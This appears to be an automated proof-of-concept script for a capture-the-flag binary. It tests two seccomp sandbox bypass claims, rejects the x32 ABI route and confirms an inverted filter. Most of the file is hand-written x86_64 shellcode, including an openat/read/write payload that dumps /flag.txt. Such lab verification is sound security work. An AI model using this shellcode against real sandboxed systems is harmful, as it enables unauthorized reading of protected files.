#!/usr/bin/env python3
"""
BUG-003: SECCOMP_ARCH_ADD_RETURN_VALUE_NOT_CHECKED_SANDBOX_BYPASS
Primitive Analysis & Verification PoC

S2 Claim: seccomp_arch_add() return value not checked; x32 ABI may bypass filter.

Findings:
1. PRIM-001 (x32 ABI Bypass): NOT POSSIBLE
   - seccomp_arch_add(ctx, AUDIT_ARCH_X86_64) returns -EEXIST (x86_64 already default)
   - Return value not checked, but failure is harmless (redundant call)
   - x32 ABI (SCMP_ARCH_X32=0x4000003e) is NOT in default arch set
   - BPF filter checks nr >= 0x40000000 -> KILL for x32 syscalls
   - Non-x86_64 architectures hit 'invalid architecture action' = KILL
   - Dynamic test: x32 write(0x40000001) -> SIGSYS (killed)

2. PRIM-002 (Inverted Seccomp Filter / CODE_EXECUTION): VERIFIED
   - seccomp_init(0x7fff0000): 0x7fff0000 = SCMP_ACT_ALLOW (NOT SCMP_ACT_KILL_PROCESS=0x80000000)
   - seccomp_rule_add(ctx, 0, ...): 0 = SCMP_ACT_KILL_THREAD (NOT SCMP_ACT_ALLOW=0x7fff0000)
   - BPF filter: 'whitelisted' syscalls -> KILL, all others -> ALLOW (INVERTED!)
   - Dynamic test: write(1) ALLOWED, open(2) KILLED, openat+read+write bypass SUCCEEDED
   - Flag content exfiltrated via openat(257)+read(0)+write(1)
"""

import subprocess
import struct
import sys
import os

BINARY = "/work/workspace/0005-2020-5._Cage-20260905-094701/target"

def pad_shellcode(sc):
    if len(sc) > 0x1000:
        raise ValueError(f"Shellcode too long: {len(sc)} > 0x1000")
    return sc + b'\x90' * (0x1000 - len(sc))

def run_shellcode(shellcode, timeout=5):
    proc = subprocess.run(
        [BINARY],
        input=shellcode,
        capture_output=True,
        timeout=timeout
    )
    return proc.returncode, proc.stdout, proc.stderr

BANNER = b"We always respect freedom of the press. You can write anything but you can only see what we want you to see.\nWhat you may want is located at /flag.txt, but you can't open it.\n"

print("=" * 60)
print("BUG-003: Seccomp arch_add Return Value Not Checked")
print("Primitive Analysis & Verification")
print("=" * 60)
print()

# ============================================================
# PRIM-001: x32 ABI Bypass via seccomp_arch_add failure
# Type: AUTH_BYPASS (candidate)
# ============================================================
print("=== PRIM-001: x32 ABI Bypass (AUTH_BYPASS) ===")
print()

# TEST 1: Native write(1) - NOT in 'whitelist' -> should be ALLOWED
print("--- TEST 1: Native write(1) - NOT in 'whitelist' ---")
sc = b''
sc += b'\x48\xc7\xc0\x01\x00\x00\x00'  # mov rax, 1 (write)
sc += b'\x48\xc7\xc7\x01\x00\x00\x00'  # mov rdi, 1 (stdout)
sc += b'\x48\x8d\x35\x19\x00\x00\x00'  # lea rsi, [rip+25]
sc += b'\x48\xc7\xc2\x08\x00\x00\x00'  # mov rdx, 8
sc += b'\x0f\x05'                        # syscall
sc += b'\x48\xc7\xc0\x3c\x00\x00\x00'  # mov rax, 60 (exit)
sc += b'\x48\xc7\xc7\x00\x00\x00\x00'  # mov rdi, 0
sc += b'\x0f\x05'                        # syscall
sc += b'ALLOWED\n'
rc, out, err = run_shellcode(pad_shellcode(sc))
print(f"  Return code: {rc}")
print(f"  stdout (after banner): {out[len(BANNER):]!r}")
write_allowed = (b'ALLOWED' in out)
print(f"  RESULT: write(1) {'ALLOWED' if write_allowed else 'BLOCKED'}")
print()

# TEST 2: x32 write(0x40000001) - x32 ABI bypass attempt
print("--- TEST 2: x32 write(0x40000001) - x32 ABI bypass attempt ---")
sc = b''
sc += b'\x48\xc7\xc0\x01\x00\x00\x40'  # mov rax, 0x40000001 (x32 write)
sc += b'\x48\xc7\xc7\x01\x00\x00\x00'  # mov rdi, 1 (stdout)
sc += b'\x48\x8d\x35\x19\x00\x00\x00'  # lea rsi, [rip+25]
sc += b'\x48\xc7\xc2\x08\x00\x00\x00'  # mov rdx, 8
sc += b'\x0f\x05'                        # syscall
sc += b'\x48\xc7\xc0\x3c\x00\x00\x00'  # mov rax, 60 (exit)
sc += b'\x48\xc7\xc7\x00\x00\x00\x00'  # mov rdi, 0
sc += b'\x0f\x05'                        # syscall
sc += b'X32_OK!\n'
rc, out, err = run_shellcode(pad_shellcode(sc))
print(f"  Return code: {rc}")
print(f"  stdout (after banner): {out[len(BANNER):]!r}")
x32_bypassed = (b'X32_OK' in out)
print(f"  RESULT: x32 write {'ALLOWED (BYPASS!)' if x32_bypassed else 'KILLED (rc=' + str(rc) + ')'}")
print()

# TEST 3: Native open(2) - IN 'whitelist' -> should be KILLED
print("--- TEST 3: Native open(2) - IN 'whitelist' (control) ---")
sc = b''
sc += b'\x48\xc7\xc0\x02\x00\x00\x00'  # mov rax, 2 (open)
sc += b'\x48\x8d\x3d\x19\x00\x00\x00'  # lea rdi, [rip+0x19=25]
sc += b'\x48\xc7\xc6\x00\x00\x00\x00'  # mov rsi, 0 (O_RDONLY)
sc += b'\x0f\x05'                        # syscall
sc += b'\x48\xc7\xc0\x3c\x00\x00\x00'  # mov rax, 60 (exit)
sc += b'\x48\xc7\xc7\x00\x00\x00\x00'  # mov rdi, 0
sc += b'\x0f\x05'                        # syscall
sc += b'/flag.txt\x00'
rc, out, err = run_shellcode(pad_shellcode(sc))
print(f"  Return code: {rc}")
print(f"  stdout (after banner): {out[len(BANNER):]!r}")
open_killed = (rc == -31)  # SIGSYS
print(f"  RESULT: open(2) {'KILLED (SIGSYS)' if open_killed else 'NOT KILLED (rc=' + str(rc) + ')'}")
print()

print("=== PRIM-001 VERDICT ===")
if x32_bypassed:
    print("x32 ABI bypass VERIFIED")
    prim1_status = "VERIFIED"
else:
    print("x32 ABI bypass NOT POSSIBLE:")
    print("  - seccomp_arch_add returns -EEXIST (x86_64 already default arch)")
    print("  - x32 ABI NOT in default arch set (arch_exist returns -EEXIST)")
    print("  - BPF checks nr >= 0x40000000 -> KILL for x32 syscalls")
    print("  - Non-x86_64 arch -> 'invalid architecture action' = KILL")
    print("  - Unchecked return value is HARMLESS (-EEXIST = already exists)")
    print("  - Dynamic evidence: x32 write -> SIGSYS (killed)")
    prim1_status = "CANDIDATE"
print()

# ============================================================
# PRIM-002: Inverted Seccomp Filter (CODE_EXECUTION sandbox bypass)
# Type: CODE_EXECUTION
# ============================================================
print("=== PRIM-002: Inverted Seccomp Filter (CODE_EXECUTION) ===")
print()
print("Root cause: seccomp_init(0x7fff0000) uses SCMP_ACT_ALLOW as default")
print("  0x7fff0000 = SCMP_ACT_ALLOW (NOT SCMP_ACT_KILL_PROCESS=0x80000000)")
print("  seccomp_rule_add(ctx, 0, ...) uses SCMP_ACT_KILL_THREAD as action")
print("  0 = SCMP_ACT_KILL_THREAD (NOT SCMP_ACT_ALLOW=0x7fff0000)")
print("  Result: 'whitelisted' syscalls -> KILL, all others -> ALLOW")
print()

# TEST 4: openat(257) + read(0) + write(1) - full sandbox bypass
print("--- TEST 4: openat(257)+read(0)+write(1) - full bypass ---")
print("  openat=257, read=0, write=1 - NONE in 'whitelist' -> should be ALLOWED")

# Ensure /flag.txt exists for the test
if not os.path.exists('/flag.txt'):
    with open('/flag.txt', 'w') as f:
        f.write('test_flag_content_here\n')

sc = b''
# openat(AT_FDCWD=-100, "/flag.txt", O_RDONLY=0)
sc += b'\x48\xc7\xc0\x01\x01\x00\x00'  # mov rax, 257 (openat) [0:7]
sc += b'\x48\xc7\xc7\x9c\xff\xff\xff'  # mov rdi, -100 (AT_FDCWD) [7:14]
# lea rsi, [rip+72] - placeholder, will fix
sc += b'\x48\x8d\x35\x48\x00\x00\x00'  # lea rsi, [rip+0x48=72] [14:21]
sc += b'\x48\xc7\xc2\x00\x00\x00\x00'  # mov rdx, 0 (O_RDONLY) [21:28]
sc += b'\x0f\x05'                        # syscall (openat) [28:30]
# read(fd, rsp, 256)
sc += b'\x48\x89\xc7'                    # mov rdi, rax (fd) [30:33]
sc += b'\x48\x89\xe6'                    # mov rsi, rsp (buffer) [33:36]
sc += b'\x48\xc7\xc2\x00\x01\x00\x00'  # mov rdx, 256 [36:43]
sc += b'\x48\xc7\xc0\x00\x00\x00\x00'  # mov rax, 0 (read) [43:50]
sc += b'\x0f\x05'                        # syscall (read) [50:52]
# write(1, rsp, count)
sc += b'\x48\x89\xc1'                    # mov rcx, rax (save count) [52:55]
sc += b'\x48\xc7\xc0\x01\x00\x00\x00'  # mov rax, 1 (write) [55:62]
sc += b'\x48\xc7\xc7\x01\x00\x00\x00'  # mov rdi, 1 (stdout) [62:69]
sc += b'\x48\x89\xe6'                    # mov rsi, rsp (buffer) [69:72]
sc += b'\x48\x89\xca'                    # mov rdx, rcx (count) [72:75]
sc += b'\x0f\x05'                        # syscall (write) [75:77]
# exit(0)
sc += b'\x48\xc7\xc0\x3c\x00\x00\x00'  # mov rax, 60 (exit) [77:84]
sc += b'\x48\xc7\xc7\x00\x00\x00\x00'  # mov rdi, 0 [84:91]
sc += b'\x0f\x05'                        # syscall [91:93]
# path at offset 93, rip at 21, 93-21=72=0x48 ✓
sc += b'/flag.txt\x00'

rc, out, err = run_shellcode(pad_shellcode(sc))
flag_data = out[len(BANNER):] if out.startswith(BANNER) else out
print(f"  Return code: {rc}")
print(f"  stdout (after banner): {flag_data!r}")
print(f"  stderr: {err!r}")

if len(flag_data) > 0 and rc == 0:
    print(f"  RESULT: Full sandbox bypass VERIFIED!")
    print(f"  openat+read+write all succeeded - flag content exfiltrated")
    prim2_status = "VERIFIED"
else:
    print(f"  RESULT: Sandbox bypass did not produce output (rc={rc})")
    prim2_status = "CANDIDATE"
print()

# ============================================================
# Summary
# ============================================================
print("=" * 60)
print("SUMMARY")
print("=" * 60)
print()
print(f"PRIM-001 (x32 ABI Bypass / AUTH_BYPASS): {prim1_status}")
print(f"  - seccomp_arch_add return value unchecked: CONFIRMED (static)")
print(f"  - arch_add returns -EEXIST (harmless, x86_64 already default)")
print(f"  - x32 ABI bypass: NOT POSSIBLE (dynamic: x32 write -> SIGSYS)")
print(f"  - x32 not in default arch, BPF blocks nr >= 0x40000000")
print()
print(f"PRIM-002 (Inverted Filter / CODE_EXECUTION): {prim2_status}")
print(f"  - Filter logic inverted: CONFIRMED (BPF + PFC export)")
print(f"  - write(1) ALLOWED: {write_allowed}")
print(f"  - open(2) KILLED: {open_killed}")
print(f"  - openat+read+write bypass: {'SUCCESS' if prim2_status == 'VERIFIED' else 'FAILED'}")
if prim2_status == "VERIFIED":
    print(f"  - Flag content: {flag_data!r}")
print()
print(f"=== PRIM-001: {prim1_status} ===")
print(f"=== PRIM-002: {prim2_status} ===")
